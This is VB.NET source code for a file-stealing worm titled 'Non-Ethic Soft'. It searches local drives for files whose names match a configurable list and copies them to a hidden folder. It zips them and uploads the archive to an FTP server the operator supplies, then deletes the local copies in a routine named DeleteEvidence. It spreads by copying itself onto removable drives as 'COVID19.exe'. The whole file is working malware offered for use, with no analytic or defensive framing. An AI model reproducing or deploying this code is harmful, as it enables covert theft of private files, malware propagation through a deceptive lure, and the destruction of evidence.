Imports System.IO
Imports System.IO.Compression
Imports System.Reflection

'Non-Ethic Soft
'Author: NFC

Module Module1
    Private mypath As String = ChosenPath()
    Private zip As String = mypath + ".zip"
    Public Sub Main()
        If My.Computer.Network.IsAvailable Then
            Directory.CreateDirectory(mypath)
            DirSearch()
            ZipThisFile()
            Upload()
            DeleteEvidence()
        End If
    End Sub
    
    Private Function ChosenPath() As String
        Dim localapp, programs, system, name, chosen As String
        Dim size, max As Long

        localapp = My.Computer.FileSystem.SpecialDirectories.CurrentUserApplicationData
        programs = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
        system = Directory.GetDirectoryRoot(localapp)

        name = ""
        chosen = ""
        size = 0
        max = 0

        For Each drive As DriveInfo In DriveInfo.GetDrives()
            If drive.DriveType = 3 Then
                size = drive.AvailableFreeSpace
                If size > max Then
                    max = size
                    name = drive.Name
                End If
            End If
        Next

        If name = system Then
            chosen = Path.Combine(localapp, NameOf(Data))
        Else
            chosen = Path.Combine(name, programs.Substring(3, programs.Length - 3), NameOf(Data))
        End If

        Return chosen
    End Function

    Private Sub DirSearch()
        Dim thisFile As String = Assembly.GetExecutingAssembly.Location()

        For Each drive As DriveInfo In DriveInfo.GetDrives()
            If drive.DriveType = 3 Then
                Research(drive.Name)
            ElseIf drive.DriveType = 2 Then
                Dim drivePath As String = Path.Combine(drive.Name, "COVID19.exe")
                File.Copy(thisFile, drivePath, True)
            End If
        Next
    End Sub

    Private Sub Target(ByVal fn As String)
        Dim target() As String = New String() {"cch"} 'Change it by will,and make sure all elements are lowercase
        Dim f As String

        f = Path.GetFileName(fn).ToLower()
        For Each e As String In target
            If f.Contains(e) Then
                File.Copy(fn, Path.Combine(mypath, f), True)
            End If
        Next
    End Sub

    Private Sub Research(ByVal sDir As String)
        On Error Resume Next

        For Each fl As String In Directory.GetFiles(sDir)
            Target(fl)
        Next

        For Each dr As String In Directory.GetDirectories(sDir)
            Dim dir As String = Path.GetDirectoryName(dr).ToLower()
            If dir.Contains("$") Or dir.Contains("appdata") Or dir.Contains("program files") Or dir.Contains("windows") Or dir.Contains("system") Then
                Continue For
            Else
                Research(dr)
            End If
        Next
    End Sub

    Private Sub ZipThisFile()
        ZipFile.CreateFromDirectory(mypath, zip)
    End Sub

    Private Sub Upload()
        Const ftp As String = "Your FTP server here"
        Dim temp, server As String
        temp = Path.GetFileNameWithoutExtension(Path.GetTempFileName) + ".zip"
        server = Path.Combine(ftp, temp)
        My.Computer.Network.UploadFile(zip, server, "", "") 'Add username and password if required
        MsgBox("Done!")
    End Sub
    Private Sub DeleteEvidence()
        On Error Resume Next
        For Each del As String In Directory.GetFiles(mypath)
            File.Delete(del)
        Next
        Directory.Delete(mypath)
        File.Delete(zip)
    End Sub
End Module
